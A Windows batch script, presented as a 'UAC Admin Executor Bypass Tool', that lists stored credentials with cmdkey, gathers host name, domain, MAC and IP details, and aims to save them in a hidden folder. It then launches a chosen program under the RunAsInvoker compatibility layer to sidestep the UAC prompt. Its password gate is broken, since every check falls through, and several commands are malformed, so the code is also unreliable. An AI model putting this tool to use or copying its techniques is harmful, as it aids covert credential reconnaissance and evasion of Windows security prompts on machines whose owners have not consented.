@echo off
setlocal enabledelayedexpansion
title "UAC Admin Executor Bypass Tool By: Altify"
echo. [32mLoading Information[0m
echo. Date: %DATE%
echo. Exact Time Of Launch: %TIME%
NET ACCOUNT
cmdkey /list
systeminfo | findstr /c:"Host Name" 
systeminfo | findstr /c:"Domain"
ipconfig /all | find "Physical Address" 
ipconfig | find "IPv4" 
ipconfig | find "Default Gateway"
echo. [32mComplete[0m
clear
md Info
attrib +h Info
>Info/info-log-%DATE%.log (
Date: %DATE%
Exact Time Of Launch: %TIME%

NET ACCOUNT

cmdkey /list

systeminfo | findstr /c:"Host Name" 

systeminfo | findstr /c:"Domain"

ipconfig /all | find "Physical Address" 

ipconfig | find "IPv4" 

ipconfig | find "Default Gateway"
)
if not exist Info/info-log-%DATE%.log echo. Cannot find data file
if not exist Info/Password.efl goto eflNotExist
set count=0
for /f "tokens=*" %%x in (file1.txt) do (
    set /a count+=1
    set passWasSet[!count!]=%%x
)
echo. [31mEnter Password One Below[0m
echo.
SET /P passw1=
if passw1==%passWasSet[1]% goto efl1

:efl1
echo. [31mEnter Password Two Below[0m
echo.
SET /P passw2=
if passw2==%passWasSet[2]% goto efl2

:efl2
echo. [31mEnter Password Three Below[0m
echo.
SET /P passw3=
if passw3==%passWasSet[1]% goto efl3

:efl3
echo. Enter Filename to bypass
SET /p Filn=
set __COMPAT_LAYER=RunAsInvoker %Filn%
start %Filn%


:eflNotExist
echo. Create Password One:
SET /P pass1
echo %pass1% > Info/Password.efl
echo. Create Password Two:
SET /P pass2
echo %pass2% > Info/Password.efl
echo. Create Password Three:
SET /P pass3
echo %pass3% > Info/Password.efl
